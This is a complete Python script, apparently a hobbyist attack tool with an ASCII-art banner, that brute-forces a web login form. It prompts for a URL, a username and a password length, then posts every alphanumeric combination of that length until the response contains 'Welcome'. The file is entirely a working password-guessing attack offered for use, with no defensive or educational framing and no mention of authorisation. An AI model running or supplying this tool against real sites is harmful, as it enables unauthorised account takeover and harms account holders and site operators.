import itertools
import string
import requests

def print_banner():
    banner = """
     _______  __   __  _______  _______  _______  _______  _______
    |       ||  | |  ||       ||       ||       ||   _   ||       |
    |    ___||  | |  ||    ___||   _   ||    ___||  |_|  ||    ___|
    |   | __ ||  |_|  ||   | _ ||  | | ||   | _ ||       ||   | _
    |   | | ||       ||   | | ||  | | ||   | | ||       ||   | |
    |   |_| ||       ||   |_| ||  |_| ||   |_| ||   _   ||   |_|
    |_______||_______||_______||_______||_______||__| |__||_______|

    """
    print(banner)

def brute_force(url, username, password_length):
    chars = string.ascii_letters + string.digits
    for password in itertools.product(chars, repeat=password_length):
        password = ''.join(password)
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if 'Welcome' in response.text:
            print(f"[+] Password found: {password}")
            return
        print(f"[!] Trying password: {password}")

if __name__ == '__main__':
    print_banner()
    url = input("Enter the login URL: ")
    username = input("Enter the username: ")
    password_length = int(input("Enter the password length: "))
    brute_force(url, username, password_length)